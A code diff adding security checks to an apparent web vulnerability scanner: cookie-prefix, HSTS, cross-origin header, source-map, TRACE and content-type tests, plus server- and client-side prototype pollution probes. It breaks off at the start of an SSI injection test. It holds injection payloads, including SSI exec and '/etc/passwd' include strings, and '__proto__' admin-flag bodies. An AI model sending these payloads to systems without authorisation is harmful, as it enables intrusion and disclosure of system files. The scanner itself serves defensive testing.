@@ -44,7 +44,7 @@ from concurrent.futures import ThreadPoolExecutor, as_completed
 from datetime import datetime
 from pathlib import Path
 
-VERSION = "2.41.1"
+VERSION = "2.42.1"
 
 # ── Adaptive concurrency ──────────────────────────────────────────────────────
 def _hw_detect():
@@ -9856,6 +9856,7 @@ DEFAULT_SETTINGS: dict = {
             "file_upload_info": True, "mass_assignment": True,
             "access_matrix":   True,   # Phase 20: multi-credential access matrix
             "bfla":            True,   # Phase 21: broken function level authorization
+            "websocket":       True,   # WebSocket endpoint security testing
         },
         "auth": {
             "enabled":                 False,
@@ -31277,6 +31278,3720 @@ _DENIAL_RE = re.compile(
 # factor before its busting results are considered more authoritative.
 _DISCOVERY_RESCORE_THRESHOLD = 1.15
 
+
+# =============================================================================
+# Gap Coverage Tests — v2.42.0
+# =============================================================================
+# 22 new security tests covering: WebSocket, source maps, cache deception,
+# OAuth/OIDC, prototype pollution, h2c smuggling, verb tunneling, MFA bypass,
+# cookie prefixes, HSTS preload, COOP/COEP/CORP, SSI/ESI injection, email
+# header injection, unicode normalization, CSRF advanced, TRACE/XST,
+# content-type confusion, password policy, API rate limiting, GraphQL advanced.
+# =============================================================================
+
+
+# ── Group A: Header & Recon Extensions ──────────────────────────────────
+# ─────────────────────────────────────────────
+# Gap Group A: Header / Recon / Misc Extensions
+# ─────────────────────────────────────────────
+# These functions are meant to be inserted into fracture.py and called
+# from the appropriate phase dispatch blocks.
+
+
+def _test_cookie_prefixes(target: dict, cfg: dict, out: "OutputManager",
+                          sess: "requests.Session") -> None:
+    """Check __Host- and __Secure- cookie prefix rules (RFC 6265bis §4.1.3).
+
+    __Host- cookies MUST have Secure, Path=/, and no Domain attribute.
+    __Secure- cookies MUST have the Secure attribute.
+    """
+    phase   = "headers"
+    url     = target["url"]
+    timeout = cfg.get("timeout", 10)
+
+    try:
+        r = sess.get(url, timeout=timeout, allow_redirects=True)
+    except Exception:
+        return
+
+    _rq, _rp = None, None
+    try:
+        _rq, _rp = _save_http_evidence(out, phase, "cookie_prefix_check", r)
+    except Exception:
+        pass
+    _ev = f"{_rq},{_rp}" if _rq else ""
+
+    # requests CaseInsensitiveDict keeps only the last value per header;
+    # use raw headers to get every Set-Cookie line.
+    _sc_raw: list = []
+    if hasattr(r, "raw") and hasattr(r.raw, "headers"):
+        _sc_raw = r.raw.headers.getlist("Set-Cookie")
+    if not _sc_raw:
+        _v = r.headers.get("Set-Cookie", "")
+        if _v:
+            _sc_raw = [_v]
+
+    for raw in _sc_raw:
+        if not raw:
+            continue
+        parts = raw.split(";")
+        if not parts:
+            continue
+        name_val = parts[0].strip()
+        cname = name_val.split("=", 1)[0].strip()
+        attrs_lower = raw.lower()
+
+        if cname.startswith("__Host-"):
+            violations = []
+            if "secure" not in attrs_lower:
+                violations.append("missing Secure flag")
+            # Must have Path=/
+            _path_match = re.search(r'path\s*=\s*([^\s;,]+)', attrs_lower)
+            if not _path_match or _path_match.group(1).strip() != "/":
+                violations.append("Path is not exactly '/'")
+            # Must NOT have Domain
+            if "domain=" in attrs_lower or "domain =" in attrs_lower:
+                violations.append("Domain attribute is set (forbidden for __Host-)")
+            if violations:
+                out.add_finding(
+                    title=f"Cookie Prefix Violation: __Host-{cname[7:]}",
+                    url=url, port=target["port"], risk="MEDIUM",
+                    description=(
+                        f"Cookie '{cname}' uses the __Host- prefix but violates "
+                        f"the prefix rules: {'; '.join(violations)}. Browsers that "
+                        f"enforce RFC 6265bis will reject or ignore this cookie, and "
+                        f"browsers that do not enforce it lose the security guarantees "
+                        f"the prefix is designed to provide (origin isolation, no "
+                        f"domain-scope widening)."
+                    ),
+                    output=f"Set-Cookie: {raw[:300]}\nViolations: {'; '.join(violations)}",
+                    output_file=_ev,
+                    sources="fracture-cookie-prefix", service=target["scheme"],
+                    affected=url,
+                    owasp="A05:2025 Security Misconfiguration", nist="SC-23",
+                    cvss_score=4.3,
+                    cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N",
+                    cwe=["CWE-614"],
+                    remediation=(
+                        "Ensure __Host- cookies are set with Secure; Path=/; and "
+                        "without a Domain attribute. If the cookie must be scoped to "
+                        "a specific path or shared across subdomains, use __Secure- "
+                        "instead."
+                    ),
+                )
+                vc.log(f"[headers] __Host- prefix violation: {cname}", "SUCCESS")
+
+        elif cname.startswith("__Secure-"):
+            if "secure" not in attrs_lower:
+                out.add_finding(
+                    title=f"Cookie Prefix Violation: __Secure-{cname[9:]}",
+                    url=url, port=target["port"], risk="MEDIUM",
+                    description=(
+                        f"Cookie '{cname}' uses the __Secure- prefix but is missing "
+                        f"the Secure attribute. Browsers enforcing RFC 6265bis will "
+                        f"reject this cookie. Without the Secure flag the cookie can "
+                        f"be sent over cleartext HTTP, defeating the purpose of the prefix."
+                    ),
+                    output=f"Set-Cookie: {raw[:300]}\nViolation: missing Secure flag",
+                    output_file=_ev,
+                    sources="fracture-cookie-prefix", service=target["scheme"],
+                    affected=url,
+                    owasp="A05:2025 Security Misconfiguration", nist="SC-23",
+                    cvss_score=4.3,
+                    cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N",
+                    cwe=["CWE-614"],
+                    remediation=(
+                        "Add the Secure attribute to all __Secure- prefixed cookies."
+                    ),
+                )
+                vc.log(f"[headers] __Secure- prefix violation: {cname}", "SUCCESS")
+
+
+def _test_hsts_preload(target: dict, cfg: dict, out: "OutputManager",
+                       sess: "requests.Session") -> None:
+    """Check if HSTS header is preload-ready (includeSubDomains + preload + max-age >= 1y)."""
+    phase   = "headers"
+    url     = target["url"]
+    timeout = cfg.get("timeout", 10)
+
+    if not target.get("is_https"):
+        return
+
+    try:
+        r = sess.get(url, timeout=timeout, allow_redirects=True)
+    except Exception:
+        return
+
+    hsts = r.headers.get("Strict-Transport-Security", "")
+    if not hsts:
+        return  # Missing HSTS is already reported by the main headers phase
+
+    hsts_lower = hsts.lower()
+    issues = []
+
+    # Check max-age
+    _ma_match = re.search(r'max-age\s*=\s*(\d+)', hsts_lower)
+    if _ma_match:
+        max_age = int(_ma_match.group(1))
+        if max_age < 31536000:
+            issues.append(f"max-age={max_age} (must be >= 31536000 for preload)")
+    else:
+        issues.append("max-age directive missing")
+
+    if "includesubdomains" not in hsts_lower:
+        issues.append("includeSubDomains directive missing")
+
+    if "preload" not in hsts_lower:
+        issues.append("preload directive missing")
+
+    if issues:
+        out.add_finding(
+            title="HSTS Not Preload-Ready",
+            url=url, port=target["port"], risk="LOW",
+            description=(
+                f"The Strict-Transport-Security header is present but does not "
+                f"meet the requirements for HSTS preload list inclusion. The HSTS "
+                f"preload list is built into browsers and forces HTTPS for the domain "
+                f"even on the first visit, preventing SSL-stripping attacks. Issues: "
+                f"{'; '.join(issues)}."
+            ),
+            output=f"Strict-Transport-Security: {hsts}\nIssues: {'; '.join(issues)}",
+            sources="fracture-hsts-preload", service=target["scheme"],
+            affected=url,
+            owasp="A05:2025 Security Misconfiguration", nist="SC-8",
+            cwe=["CWE-523"],
+            remediation=(
+                "Set the HSTS header to: Strict-Transport-Security: "
+                "max-age=63072000; includeSubDomains; preload — then submit "
+                "the domain to hstspreload.org. Verify all subdomains support "
+                "HTTPS before enabling includeSubDomains."
+            ),
+        )
+        vc.log("[headers] HSTS not preload-ready", "SUCCESS")
+
+
+def _test_coop_coep_corp(target: dict, cfg: dict, out: "OutputManager",
+                         sess: "requests.Session") -> None:
+    """Check for missing Cross-Origin isolation headers (COOP, COEP, CORP)."""
+    phase   = "headers"
+    url     = target["url"]
+    timeout = cfg.get("timeout", 10)
+
+    try:
+        r = sess.get(url, timeout=timeout, allow_redirects=True)
+    except Exception:
+        return
+
+    _headers_to_check = [
+        (
+            "Cross-Origin-Opener-Policy",
+            "COOP",
+            "Controls which cross-origin documents can share a browsing context group "
+            "with the page. Without COOP, cross-origin popups opened by the page (or "
+            "that open the page) can access each other's window objects, enabling "
+            "Spectre-class side-channel attacks and cross-origin data leaks.",
+            "Set the Cross-Origin-Opener-Policy header to 'same-origin' to isolate "
+            "the browsing context. Use 'same-origin-allow-popups' if the page must "
+            "communicate with cross-origin popups it opens.",
+        ),
+        (
+            "Cross-Origin-Embedder-Policy",
+            "COEP",
+            "Controls whether the page can load cross-origin resources that have not "
+            "opted in via CORS or CORP. Without COEP, cross-origin resources loaded "
+            "into the page can be exploited via Spectre-class side-channel attacks. "
+            "COEP is required together with COOP to enable cross-origin isolation "
+            "(SharedArrayBuffer, high-resolution timers).",
+            "Set the Cross-Origin-Embedder-Policy header to 'require-corp' or "
+            "'credentialless'. Ensure all embedded cross-origin resources serve "
+            "appropriate CORP or CORS headers.",
+        ),
+        (
+            "Cross-Origin-Resource-Policy",
+            "CORP",
+            "Controls which origins can embed this resource. Without CORP, any "
+            "cross-origin page can embed the resource (e.g. in an <img>, <script>, "
+            "or <iframe>), enabling data exfiltration via Spectre-class side-channel "
+            "attacks on the embedding page.",
+            "Set the Cross-Origin-Resource-Policy header to 'same-origin' for "
+            "resources that should only be loaded by the same origin, or "
+            "'same-site' for same-site loading. Use 'cross-origin' only for "
+            "genuinely public resources.",
+        ),
+    ]
+
+    for hdr_name, short, desc, remed in _headers_to_check:
+        if hdr_name not in r.headers:
+            out.add_finding(
+                title=f"Missing Security Header: {hdr_name}",
+                url=url, port=target["port"], risk="INFO",
+                description=f"The {hdr_name} ({short}) header is not set. {desc}",
+                output=f"Response headers do not include {hdr_name}.",
+                sources="fracture-cross-origin-headers", service=target["scheme"],
+                affected=url,
+                owasp="A05:2025 Security Misconfiguration", nist="SC-7",
+                cwe=["CWE-346"],
+                remediation=remed,
+            )
+            vc.log(f"[headers] Missing {short}: {hdr_name}", "INFO")
+
+
+def _test_source_maps(target: dict, cfg: dict, out: "OutputManager",
+                      sess: "requests.Session",
+                      crawl_data: dict = None) -> None:
+    """Check for exposed JavaScript source map files (.js.map).
+
+    Source maps contain the original, un-minified source code including comments,
+    variable names, internal API endpoints, and potentially secrets.
+    """
+    phase   = "recon"
+    url     = target["url"]
+    timeout = cfg.get("timeout", 10)
+    vc.status(phase, "Source Maps", "running", "Checking for .js.map files", 0, 1)
+
+    # Collect JS URLs from crawl data and page content
+    js_urls: set = set()
+
+    # From crawl_data links
+    if crawl_data:
+        for link in crawl_data.get("links", []):
+            if isinstance(link, str) and link.endswith(".js"):
+                js_urls.add(link)
+            elif isinstance(link, dict) and str(link.get("url", "")).endswith(".js"):
+                js_urls.add(link["url"])
+
+    # Fetch the base page and extract <script src="..."> tags
+    try:
+        r = sess.get(url, timeout=timeout, allow_redirects=True)
+        for m in re.finditer(r'<script\b[^>]+\bsrc=["\']([^"\']+\.js)["\']',
+                             r.text, re.IGNORECASE):
+            src = m.group(1)
+            if src.startswith("//"):
+                src = target["scheme"] + ":" + src
+            elif src.startswith("/"):
+                src = f"{target['scheme']}://{target['hostname']}:{target['port']}{src}"
+            elif not src.startswith("http"):
+                src = urllib.parse.urljoin(url, src)
+            js_urls.add(src)
+    except Exception:
+        pass
+
+    # Only check same-origin JS files, cap at 20
+    _same_origin = target["hostname"].lower()
+    js_urls = [
+        u for u in js_urls
+        if urllib.parse.urlparse(u).hostname and
+        urllib.parse.urlparse(u).hostname.lower() == _same_origin
+    ][:20]
+
+    _found: set = set()
+    for js_url in js_urls:
+        if js_url in _found:
+            continue
+        map_url = js_url + ".map"
+        try:
+            r = sess.get(map_url, timeout=timeout, allow_redirects=False)
+            # Valid source maps are JSON with "version" and "sources" keys
+            if r.status_code == 200 and r.headers.get("Content-Type", "").startswith(
+                ("application/json", "application/octet-stream", "text/plain")
+            ):
+                body = r.text[:2000]
+                if '"version"' in body and '"sources"' in body:
+                    _found.add(js_url)
+                    _rq, _rp = _save_http_evidence(out, phase, f"sourcemap_{js_url.split('/')[-1][:40]}", r)
+                    # Count source files exposed
+                    _src_count = body.count('"sources"')
+                    try:
+                        _map_data = r.json()
+                        _src_count = len(_map_data.get("sources", []))
+                    except Exception:
+                        pass
+                    out.add_finding(
+                        title="JavaScript Source Map Exposed",
+                        url=map_url, port=target["port"], risk="MEDIUM",
+                        description=(
+                            f"A JavaScript source map file is publicly accessible at "
+                            f"{map_url}. Source maps contain the original un-minified "
+                            f"source code, including comments, internal API routes, "
+                            f"configuration values, and potentially embedded secrets. "
+                            f"This file exposes approximately {_src_count} source "
+                            f"file(s) from the build."
+                        ),
+                        output=f"URL: {map_url}\nHTTP {r.status_code}\nSources: ~{_src_count} files\nPreview: {body[:500]}",
+                        output_file=f"{_rq},{_rp}",
+                        sources="fracture-source-maps", service=target["scheme"],
+                        affected=js_url,
+                        owasp="A05:2025 Security Misconfiguration", nist="SC-28",
+                        cvss_score=5.3,
+                        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+                        cwe=["CWE-540"],
+                        remediation=(
+                            "Remove source map files from production deployments. Configure "
+                            "the build pipeline to either not generate source maps for "
+                            "production builds, or to upload them to a private error-tracking "
+                            "service (e.g. Sentry). Remove //# sourceMappingURL comments from "
+                            "production JS files."
+                        ),
+                    )
+                    vc.log(f"[recon] Source map exposed: {map_url}", "SUCCESS")
+        except Exception:
+            pass
+
+        # Also check for sourceMappingURL in the JS file itself
+        if js_url not in _found:
+            try:
+                r_js = sess.get(js_url, timeout=timeout, allow_redirects=True)
+                if r_js.status_code == 200:
+                    # Check last 500 bytes for the comment
+                    tail = r_js.text[-500:] if len(r_js.text) > 500 else r_js.text
+                    _sm_match = re.search(
+                        r'//[#@]\s*sourceMappingURL\s*=\s*(\S+)', tail)
+                    if _sm_match:
+                        _sm_url = _sm_match.group(1).strip()
+                        if _sm_url.startswith("data:"):
+                            # Inline source map — entire source embedded in the JS file
+                            _found.add(js_url)
+                            out.add_finding(
+                                title="Inline Source Map in JavaScript Bundle",
+                                url=js_url, port=target["port"], risk="MEDIUM",
+                                description=(
+                                    f"The JavaScript file at {js_url} contains an inline "
+                                    f"source map (data: URI in sourceMappingURL). This "
+                                    f"embeds the complete original source code directly "
+                                    f"in the production bundle."
+                                ),
+                                output=f"URL: {js_url}\nsourceMappingURL=data:... (inline)",
+                                sources="fracture-source-maps", service=target["scheme"],
+                                affected=js_url,
+                                owasp="A05:2025 Security Misconfiguration", nist="SC-28",
+                                cvss_score=5.3,
+                                cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+                                cwe=["CWE-540"],
+                                remediation=(
+                                    "Configure the build tool to disable inline source maps "
+                                    "in production. Use devtool: false (webpack), "
+                                    "sourcemap: false (Vite/Rollup), or equivalent."
+                                ),
+                            )
+                            vc.log(f"[recon] Inline source map: {js_url}", "SUCCESS")
+            except Exception:
+                pass
+
+    vc.status(phase, "Source Maps", "complete", f"Checked {len(js_urls)} JS files", 1, 1)
+    vc.log(f"[recon] Source map check complete — {len(_found)} exposed", "SUCCESS")
+
+
+def _test_content_type_confusion(target: dict, cfg: dict, out: "OutputManager",
+                                 sess: "requests.Session") -> None:
+    """Test for content-type confusion / MIME sniffing vulnerabilities."""
+    phase   = "headers"
+    url     = target["url"]
+    timeout = cfg.get("timeout", 10)
+
+    # Test 1: Request the base URL with a mismatched Accept header
+    _tests = [
+        # (accept_header, expected_ct_prefix, description)
+        ("application/json", "text/html", "HTML page served as JSON when requested"),
+        ("text/css", "text/html", "HTML page served as CSS when requested"),
+    ]
+
+    for accept_val, normal_ct, desc_note in _tests:
+        try:
+            r = sess.get(url, timeout=timeout, allow_redirects=True,
+                         headers={"Accept": accept_val})
+            resp_ct = r.headers.get("Content-Type", "").split(";")[0].strip().lower()
+            # If the server changed its Content-Type to match our Accept header
+            # AND the body is still HTML, that's a content-type confusion
+            if (resp_ct == accept_val.lower()
+                    and "<html" in r.text[:2000].lower()
+                    and "x-content-type-options" not in
+                    {k.lower() for k in r.headers}):
+                _rq, _rp = _save_http_evidence(out, phase, f"ct_confusion_{accept_val.replace('/', '_')}", r)
+                out.add_finding(
+                    title="Content-Type Confusion",
+                    url=url, port=target["port"], risk="LOW",
+                    description=(
+                        f"The server returned HTML content with Content-Type "
+                        f"'{resp_ct}' when the request specified Accept: {accept_val}. "
+                        f"Combined with the absence of X-Content-Type-Options: nosniff, "
+                        f"this allows browsers to MIME-sniff the response, potentially "
+                        f"enabling XSS via content injection in contexts where the "
+                        f"declared content-type would otherwise prevent script execution."
+                    ),
+                    output=(
+                        f"Request Accept: {accept_val}\n"
+                        f"Response Content-Type: {resp_ct}\n"
+                        f"X-Content-Type-Options: (not set)\n"
+                        f"Body contains HTML: yes"
+                    ),
+                    output_file=f"{_rq},{_rp}",
+                    sources="fracture-content-type-confusion", service=target["scheme"],
+                    affected=url,
+                    owasp="A05:2025 Security Misconfiguration", nist="SI-10",
+                    cwe=["CWE-430"],
+                    remediation=(
+                        "Always set X-Content-Type-Options: nosniff to prevent MIME "
+                        "sniffing. Ensure the Content-Type header accurately reflects "
+                        "the response body regardless of the Accept request header."
+                    ),
+                )
+                vc.log(f"[headers] Content-Type confusion: {url} served HTML as {resp_ct}", "SUCCESS")
+                break  # One finding is enough
+        except Exception:
+            pass
+
+
+def _test_trace_xst(target: dict, cfg: dict, out: "OutputManager",
+                    sess: "requests.Session") -> None:
+    """Test TRACE method for Cross-Site Tracing (XST).
+
+    Uses a raw socket because the requests library does not natively support
+    the TRACE HTTP method and some adapters block it.
+    """
+    import socket as _sock, ssl as _ssl2, select as _sel2
+
+    phase    = "headers"
+    url      = target["url"]
+    hostname = target["hostname"]
+    port     = target["port"]
+    scheme   = target["scheme"]
+    timeout  = cfg.get("timeout", 10)
+    use_tls  = scheme == "https"
+    parsed   = urllib.parse.urlparse(url)
+    path     = parsed.path or "/"
+
+    try:
+        sock = _sock.create_connection((hostname, port), timeout=timeout)
+        sock.settimeout(None)
+        if use_tls:
+            ctx = _ssl2.create_default_context()
+            if not cfg.get("verify_ssl", False):
+                ctx.check_hostname = False
+                ctx.verify_mode = _ssl2.CERT_NONE
+            sock = ctx.wrap_socket(sock, server_hostname=hostname)
+
+        # Send TRACE request with a canary header
+        _canary = f"X-Fracture-Trace-Canary: trace-test-{int(time.time())}"
+        req = (
+            f"TRACE {path} HTTP/1.1\r\n"
+            f"Host: {hostname}\r\n"
+            f"{_canary}\r\n"
+            f"Connection: close\r\n"
+            f"\r\n"
+        )
+        sock.sendall(req.encode())
+
+        # Read response
+        buf = b""
+        deadline = time.time() + timeout
+        while time.time() < deadline:
+            rem = max(deadline - time.time(), 0.05)
+            ready = _sel2.select([sock], [], [], min(rem, 1.0))
+            if not ready[0]:
+                if buf:
+                    break
+                continue
+            try:
+                chunk = sock.recv(8192)
+            except (_sock.error, _ssl2.SSLError, OSError):
+                break
+            if not chunk:
+                break
+            buf += chunk
+            if b"\r\n\r\n" in buf and len(buf) > 200:
+                break
+
+        sock.close()
+
+        resp = buf.decode("utf-8", errors="replace")
+
+        # Check if server returned 200 and reflected our headers
+        _status_line = resp.split("\r\n")[0] if resp else ""
+        try:
+            _code = int(_status_line.split()[1])
+        except (IndexError, ValueError):
+            _code = 0
+
+        if _code == 200 and _canary.lower() in resp.lower():
+            # TRACE is enabled and reflects headers — XST vulnerability
+            _ev_path = out.output_path(phase, "trace_xst_response")
+            _ev_path.write_text(resp[:4000], encoding="utf-8")
+            out.add_finding(
+                title="HTTP TRACE Method Enabled (Cross-Site Tracing)",
+                url=url, port=target["port"], risk="MEDIUM",
+                description=(
+                    "The web server has the HTTP TRACE method enabled and reflects "
+                    "request headers (including authentication cookies and tokens) "
+                    "in the response body. An attacker who can induce a victim's browser "
+                    "to send a TRACE request (via XSS or a misconfigured CORS policy) "
+                    "can steal HttpOnly cookies and Authorization headers that are "
+                    "normally inaccessible to JavaScript."
+                ),
+                output=(
+                    f"TRACE {path} HTTP/1.1\n"
+                    f"Response: HTTP {_code}\n"
+                    f"Canary reflected: {_canary}\n"
+                    f"Response body (first 500 chars):\n{resp[:500]}"
+                ),
+                output_file=str(_ev_path),
+                sources="fracture-trace-xst", service=target["scheme"],
+                affected=url,
+                owasp="A05:2025 Security Misconfiguration", nist="CM-7",
+                cvss_score=5.3,
+                cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+                cwe=["CWE-693"],
+                remediation=(
+                    "Disable the TRACE method on the web server. In Apache: "
+                    "TraceEnable off. In IIS: configure Request Filtering to deny "
+                    "the TRACE verb. In nginx: TRACE is disabled by default; verify "
+                    "no proxy_pass is forwarding it to a backend that allows it."
+                ),
+            )
+            vc.log(f"[headers] TRACE method enabled — XST vulnerability at {url}", "SUCCESS")
+        elif _code == 200:
+            vc.log("[headers] TRACE returned 200 but did not reflect canary", "INFO")
+        else:
+            vc.log(f"[headers] TRACE returned HTTP {_code} — method disabled", "INFO")
+
+    except (ConnectionRefusedError, _sock.timeout, OSError) as e:
+        vc.log(f"[headers] TRACE test connection failed: {e}", "INFO")
+    except Exception as e:
+        vc.log(f"[headers] TRACE test error: {e}", "INFO")
+
+# ── Injection Extensions ──────────────────────────────────────────────
+
+# ─────────────────────────────────────────────
+# Server-Side Prototype Pollution
+# ─────────────────────────────────────────────
+
+_PROTO_POLLUTION_PAYLOADS = [
+    (
+        {"__proto__": {"fr_canary": "fracture_pp_test", "isAdmin": True, "status": 200}},
+        "__proto__",
+    ),
+    (
+        {"constructor": {"prototype": {"fr_canary": "fracture_pp_test", "isAdmin": True}}},
+        "constructor.prototype",
+    ),
+]
+
+_PROTO_POLLUTION_INDICATORS = re.compile(
+    r"fr_canary|fracture_pp_test|"
+    r"__proto__|prototype\s*pollution|"
+    r"Object\.assign|Object\.defineProperty.*__proto__|"
+    r"Cannot\s+set\s+propert(?:y|ies)\s+of\s+(?:undefined|null)",
+    re.I,
+)
+
+
+def _test_prototype_pollution_server(target: dict, cfg: dict,
+                                     out: "OutputManager",
+                                     sess: "requests.Session",
+                                     crawl_data: dict) -> None:
+    """Test server-side prototype pollution via JSON POST bodies."""
+    phase   = "injection"
+    url     = target["url"]
+    timeout = cfg.get("timeout", 10)
+    forms   = crawl_data.get("forms", [])
+    params  = crawl_data.get("params", [])
+
+    # Collect candidate endpoints: form actions + param URLs (dedup)
+    _seen: set = set()
+    _endpoints: list = []
+    for form in forms:
+        action = form.get("action", url)
+        if action not in _seen:
+            _seen.add(action)
+            _endpoints.append(action)
+    for entry in params:
+        ep = entry.get("url", "")
+        if ep and ep not in _seen:
+            _seen.add(ep)
+            _endpoints.append(ep)
+    if url not in _seen:
+        _endpoints.insert(0, url)
+
+    vc.log(f"[injection] Prototype pollution: testing {min(len(_endpoints), 10)} endpoints", "INFO")
+
+    for ep in _endpoints[:10]:
+        # Get baseline response (normal JSON POST)
+        try:
+            _bl = sess.post(ep, json={"test": "value"}, timeout=timeout,
+                            headers={"Content-Type": "application/json"})
+        except Exception:
+            continue
+
+        for payload, label in _PROTO_POLLUTION_PAYLOADS:
+            try:
+                r = sess.post(ep, json=payload, timeout=timeout,
+                              headers={"Content-Type": "application/json"})
+                if r is None:
+                    continue
+
+                # Strip payload reflection before checking indicators
+                _body = r.text
+                for _enc in ('"fr_canary"', '"fracture_pp_test"',
+                             '"__proto__"', '"constructor"'):
+                    _body = _body.replace(_enc, "")
+
+                _polluted = False
+                # Check 1: canary value appears in a DIFFERENT response field
+                if "fracture_pp_test" in _body:
+                    _polluted = True
+                # Check 2: response behavior changed (different status, different
+                # body length beyond a tolerance band)
+                if (r.status_code != _bl.status_code and
+                        r.status_code in (500, 403, 200)):
+                    if abs(len(r.text) - len(_bl.text)) > max(50, len(_bl.text) * 0.3):
+                        _polluted = True
+                # Check 3: stack trace / error mentioning prototype
+                if r.status_code == 500 and _PROTO_POLLUTION_INDICATORS.search(_body):
+                    _polluted = True
+
+                if _polluted:
+                    _rq, _rp = _save_http_evidence(
+                        out, phase, f"proto_pollution_{label}", r,
+                        endpoint_url=ep, method="POST")
+                    out.add_finding(
+                        title="Server-Side Prototype Pollution",
+                        url=ep, port=target["port"], risk="HIGH",
+                        description=(
+                            f"The endpoint at {ep} is susceptible to server-side "
+                            f"prototype pollution via {label} injection in a JSON "
+                            f"POST body. An attacker can inject properties into "
+                            f"Object.prototype, potentially bypassing security "
+                            f"checks, escalating privileges, or causing denial of "
+                            f"service across all objects in the application."
+                        ),
+                        output=(
+                            f"Endpoint: {ep}\nVector: {label}\n"
+                            f"Payload: {payload}\n"
+                            f"Baseline: HTTP {_bl.status_code} ({len(_bl.text)} bytes)\n"
+                            f"Polluted: HTTP {r.status_code} ({len(r.text)} bytes)\n"
+                            f"Response excerpt: {r.text[:400]}"
+                        ),
+                        output_file=f"{_rq},{_rp}",
+                        sources="fracture-prototype-pollution",
+                        service=target["scheme"],
+                        affected=ep,
+                        owasp="A03:2025 Injection", nist="SI-10",
+                        remediation=(
+                            "Sanitise user-supplied JSON before merging into objects. "
+                            "Use Object.create(null) for lookup maps, or use a schema "
+                            "validator that rejects __proto__ and constructor keys. "
+                            "Libraries like lodash (>=4.17.12) and fast-json-parse "
+                            "strip prototype keys by default."
+                        ),
+                        cwe=["CWE-1321"],
+                        cvss_score=7.3,
+                        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L",
+                    )
+                    vc.log(f"[injection] Prototype pollution via {label} at {ep}",
+                           "SUCCESS")
+                    break  # one vector per endpoint is enough
+            except Exception:
+                pass
+
+
+# ─────────────────────────────────────────────
+# Client-Side Prototype Pollution Detection
+# ─────────────────────────────────────────────
+
+_CLIENT_PP_SINKS = re.compile(
+    r"Object\.assign\s*\(\s*\{\s*\}|"
+    r"_\.merge\s*\(|_\.extend\s*\(|_\.defaultsDeep\s*\(|"
+    r"\$\.extend\s*\((?:true\s*,\s*)?\{\s*\}|"
+    r"Object\.setPrototypeOf|"
+    r"Reflect\.(?:set|defineProperty)|"
+    r"(?:query|hash|search|fragment|params)\s*[\[.].*__proto__",
+    re.I,
+)
+
+
+def _test_prototype_pollution_client(target: dict, cfg: dict,
+                                     out: "OutputManager",
+                                     sess: "requests.Session",
+                                     crawl_data: dict) -> None:
+    """Detect potential client-side prototype pollution via static JS analysis."""
+    phase   = "injection"
+    url     = target["url"]
+    timeout = cfg.get("timeout", 10)
+    links   = crawl_data.get("links", [])
+
+    # Collect JS URLs from crawl data
+    _js_urls: list = []
+    for link in links:
+        _href = link if isinstance(link, str) else link.get("url", "")
+        if _href and _href.lower().endswith(".js"):
+            _js_urls.append(_href)
+    # Also try fetching the main page and extracting <script src>
+    try:
+        _main = sess.get(url, timeout=timeout)
+        for _m in re.finditer(r'<script[^>]+src=["\']([^"\']+\.js(?:\?[^"\']*)?)["\']',
+                              _main.text, re.I):
+            _src = urllib.parse.urljoin(url, _m.group(1))
+            if _src not in _js_urls:
+                _js_urls.append(_src)
+    except Exception:
+        pass
+
+    _found: set = set()
+
+    for _js_url in _js_urls[:15]:
+        try:
+            _r = sess.get(_js_url, timeout=timeout)
+            if _r.status_code != 200 or len(_r.text) < 50:
+                continue
+            _matches = _CLIENT_PP_SINKS.findall(_r.text)
+            if _matches and _js_url not in _found:
+                _found.add(_js_url)
+                _match_preview = "; ".join(set(_matches))[:200]
+                out.add_finding(
+                    title="Potential Client-Side Prototype Pollution",
+                    url=_js_url, port=target["port"], risk="MEDIUM",
+                    description=(
+                        f"The JavaScript file at {_js_url} contains code patterns "
+                        f"that are known sinks for client-side prototype pollution "
+                        f"(e.g. Object.assign, _.merge, $.extend). If user-controlled "
+                        f"input (URL parameters, hash fragments, postMessage data) "
+                        f"reaches these sinks without sanitisation, an attacker can "
+                        f"inject properties into Object.prototype, potentially leading "
+                        f"to XSS, authentication bypass, or DOM manipulation."
+                    ),
+                    output=(
+                        f"File: {_js_url}\n"
+                        f"Matching patterns: {_match_preview}\n"
+                        f"File size: {len(_r.text)} bytes"
+                    ),
+                    sources="fracture-prototype-pollution-client",
+                    service=target["scheme"],
+                    affected=_js_url,
+                    owasp="A03:2025 Injection", nist="SI-10",
+                    cvss_score=6.1,
+                    cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+                    cwe=["CWE-1321"],
+                    remediation=(
+                        "Avoid using recursive merge functions (_.merge, $.extend with "
+                        "deep=true, Object.assign) on user-controlled input. Use "
+                        "Object.create(null) for property bags, or explicitly filter "
+                        "__proto__ and constructor keys from untrusted data before merging."
+                    ),
+                )
+                vc.log(f"[injection] Client-side PP sink found in {_js_url}", "SUCCESS")
+        except Exception:
+            pass
+
+    vc.log(f"[injection] Client-side prototype pollution scan complete "
+           f"({len(_found)} sinks found in {len(_js_urls)} JS files)", "INFO")
+
+
+# ─────────────────────────────────────────────
+# Server-Side Include (SSI) Injection
+# ─────────────────────────────────────────────
+
+_SSI_PAYLOADS = [
+    ('<!--#echo var="DATE_LOCAL" -->', "echo"),
+    ('<!--#echo var="DOCUMENT_URI" -->', "echo-uri"),
+    ('<!--#exec cmd="echo fracture_ssi_test" -->', "exec"),
+    ('<!--#include virtual="/etc/passwd" -->', "include"),
+]
+
+# Patterns that indicate SSI was processed (not just reflected)
+_SSI_SUCCESS_RE = re.compile(
+    r"fracture_ssi_test|"
+    r"\d{4}-\d{2}-\d{2}|"      # DATE_LOCAL output
+    r"root:.*:0:0:|"            # /etc/passwd
+    r"Mon|Tue|Wed|Thu|Fri|Sat|Sun",  # Day name from date
+    re.I,
+)
+
+
+def _test_ssi_injection(target: dict, cfg: dict,
+                        out: "OutputManager",
+                        sess: "requests.Session",
+                        crawl_data: dict) -> None:
+    """Test for Server-Side Include (SSI) injection in form fields."""
+    phase   = "injection"
+    url     = target["url"]
+    timeout = cfg.get("timeout", 10)
